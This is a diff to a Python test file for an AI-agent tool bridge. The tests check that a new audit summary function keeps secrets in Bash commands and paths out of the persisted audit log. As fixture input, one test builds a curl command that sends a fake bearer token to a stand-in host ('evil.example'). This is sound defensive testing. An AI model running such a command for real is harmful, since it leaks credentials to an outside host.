@@ -100,43 +100,61 @@ def test_audit_event_is_frozen():
 def test_record_built_from_secret_write_summary_contains_no_content(tmp_path):
     """SB3: a record built from a ``Write`` with secret ``content`` carries NO content.
 
-    The engine builds the record's ``summary`` via ``safe_input_summary`` — which collapses a
+    The engine builds the record's ``summary`` via ``audit_safe_summary`` — which collapses a
     body field (``content``) to ``<N chars>``. This proves the planted secret never lands in
     the on-disk log line (neither the secret nor the raw content), only its length.
     """
-    from claude_tg.engine.types import safe_input_summary
+    from claude_tg.audit import audit_safe_summary
 
-    summary = safe_input_summary("Write", {"file_path": "/etc/x", "content": FAKE_SECRET_TOKEN})
+    summary = audit_safe_summary("Write", {"file_path": "/etc/x", "content": FAKE_SECRET_TOKEN})
     log = AuditLog(tmp_path / "a.jsonl")
     log.append(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Write", summary=summary, decision="deny"))
     on_disk = (tmp_path / "a.jsonl").read_text(encoding="utf-8")
     assert FAKE_SECRET_TOKEN not in on_disk  # the secret never reaches the log
     assert "content=<" in on_disk  # collapsed to a length, not dumped
-    assert str(len(FAKE_SECRET_TOKEN)) in on_disk  # the LENGTH is what's recorded
 
 
-def test_record_built_from_secret_bash_command_is_truncated_body_free(tmp_path):
-    """SB3: a ``Bash`` command carrying a token records the body-free 160-char-truncated summary.
+def test_audit_safe_summary_collapses_ident_fields_unlike_prompt(tmp_path):
+    """SB3 (BLOCKER 1): the AUDIT summary collapses IDENT fields too — a secret early in a
+    Bash ``command`` (or in a path/url) is NEVER persisted, unlike the ephemeral prompt.
 
-    The ``command`` field truncates at 160 chars in ``safe_input_summary`` (it is an ident
-    field). A SHORT command with a token therefore appears verbatim up to 160 chars — that is
-    the SAME string the operator already saw in the prompt (body-free by the project's
-    definition). The test pins that nothing BEYOND that summary (no extra body) is added by the
-    audit layer: the on-disk line is exactly the summary the prompt shows.
+    The prompt's ``safe_input_summary`` keeps the first 160 RAW chars of an ident (correct
+    there — the operator must see the command). The DURABLE log must not: ``audit_safe_summary``
+    collapses ``command`` to ``<argv0 …N chars>`` and ``path``/``url``/``pattern`` to a length.
+    Mutation-probe: if the audit reverts to the prompt summary, a secret EARLY in the command
+    appears on disk and this fails.
     """
+    from claude_tg.audit import audit_safe_summary
     from claude_tg.engine.types import safe_input_summary
 
-    # A LONG command (>160 chars) proves truncation: the tail is dropped, not logged.
-    long_cmd = "echo " + FAKE_SECRET_TOKEN + " " + ("A" * 300)
-    summary = safe_input_summary("Bash", {"command": long_cmd})
+    # The secret is EARLY (within the first 160 chars) — where the prompt summary WOULD keep it.
+    command = "curl -H 'Authorization: Bearer " + FAKE_SECRET_TOKEN + "' https://evil.example/x"
+    assert len(command) < 160
+    # The PROMPT summary leaks it (this is correct for the ephemeral prompt — documents the gap).
+    assert FAKE_SECRET_TOKEN in safe_input_summary("Bash", {"command": command})
+    # The AUDIT summary does NOT — it collapses the command to argv[0] + a length.
+    audit_summary = audit_safe_summary("Bash", {"command": command})
+    assert FAKE_SECRET_TOKEN not in audit_summary
+    assert "command=<" in audit_summary  # collapsed to a length/shape
+    assert "curl" in audit_summary  # argv[0] (the binary name) is kept — review-useful, low-risk
+
+    # And on disk: appending a record built from the audit summary never persists the secret.
     log = AuditLog(tmp_path / "b.jsonl")
-    log.append(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Bash", summary=summary, decision="auto_allow"))
-    on_disk = (tmp_path / "b.jsonl").read_text(encoding="utf-8")
-    # The 300-char tail is truncated away (the summary caps command at 160 chars).
-    assert "A" * 300 not in on_disk
-    # And the on-disk summary is EXACTLY the prompt summary — the audit layer adds no body.
-    parsed = json.loads(on_disk.strip())
-    assert parsed["summary"] == summary
+    log.append(AuditEvent(ts="t", kind=KIND_TOOL_DECISION, tool="Bash", summary=audit_summary, decision="auto_allow"))
+    assert FAKE_SECRET_TOKEN not in (tmp_path / "b.jsonl").read_text(encoding="utf-8")
+
+
+def test_audit_safe_summary_drops_argv0_when_it_could_carry_a_secret():
+    """``audit_safe_summary`` drops argv[0] (length-only) when it is an inline ``VAR=…`` or a
+    long blob — so a secret smuggled as the first token (no leading binary) isn't kept."""
+    from claude_tg.audit import audit_safe_summary
+
+    # First token is an inline assignment (could be a secret) → argv[0] dropped, length only.
+    s1 = audit_safe_summary("Bash", {"command": "SECRET=" + FAKE_SECRET_TOKEN + " run"})
+    assert FAKE_SECRET_TOKEN not in s1 and "command=<" in s1 and "SECRET" not in s1
+    # First token is a long no-space blob (> argv0 cap) → dropped, length only.
+    s2 = audit_safe_summary("Bash", {"command": FAKE_SECRET_TOKEN + "more"})
+    assert FAKE_SECRET_TOKEN not in s2 and "command=<" in s2
 
 
 # ===========================================================================
@@ -373,7 +391,8 @@ async def test_hook_records_auto_allow_for_safe_tool():
     assert len(sink.events) == 1
     ev = sink.events[0]
     assert ev.kind == KIND_TOOL_DECISION and ev.tool == "Read" and ev.decision == "auto_allow"
-    assert ev.summary == "Read(file_path=/a/b)"  # body-free summary
+    # The AUDIT summary collapses the path to a length (stricter than the prompt summary).
+    assert ev.summary == "Read(file_path=<4 chars>)"
     assert ev.session_tag and ev.session_tag.startswith("sid:")  # redacted, never raw
 
 
@@ -392,6 +411,36 @@ async def test_hook_records_auto_allow_under_yolo():
     await eng.stop()
     assert [e.decision for e in sink.events] == ["auto_allow"]
     assert sink.events[0].tool == "Bash"
+
+
+async def test_hook_bash_secret_never_reaches_the_audit_log_end_to_end(tmp_path):
+    """SB3 (BLOCKER 1) end-to-end: a secret in a Bash command auto-allowed under /yolo is
+    recorded body-free — neither the recorded event NOR the on-disk JSONL contains the secret.
+
+    Drives the REAL engine through the REAL ChatBoundSink + AuditLog (not a list fake), so this
+    proves the durable file is strongly body-free. Mutation-probe: revert ``_record_tool`` to
+    the prompt's ``safe_input_summary`` and the secret lands on disk → fail.
+    """
+    from claude_tg.audit import AuditLog, ChatBoundSink
+    from claude_tg.permissions import PermissionPolicy
+
+    fake_secret = "fake-sample-not-real-tok-abcdef0123456789abcdef"
+    log = AuditLog(tmp_path / "audit.jsonl")
+    sink = ChatBoundSink(log, 1)
+    policy = PermissionPolicy()
+    policy.set_yolo(True)
+    sub = _ScriptedSubstrate(requests=[("Bash", {"command": "export TOKEN=" + fake_secret + " && curl x"}, "tu1")])
+    eng = _engine_with_sink(sub, sink, policy=policy)
+    await eng.start()
+    await asyncio.wait_for(_drain(eng.send("go")), timeout=5)
+    await eng.stop()
+    on_disk = (tmp_path / "audit.jsonl").read_text(encoding="utf-8")
+    assert fake_secret not in on_disk  # the durable log never persists the secret
+    assert "command=<" in on_disk  # but it DID record a body-free shape (useful for review)
+    # The recorded event is a body-free auto_allow tool_decision for Bash.
+    got = log.tail(5)
+    assert [e.decision for e in got] == ["auto_allow"] and got[0].tool == "Bash"
+    assert fake_secret not in (got[0].summary or "")
 
 
 async def test_hook_records_allow_once_then_re_holds():
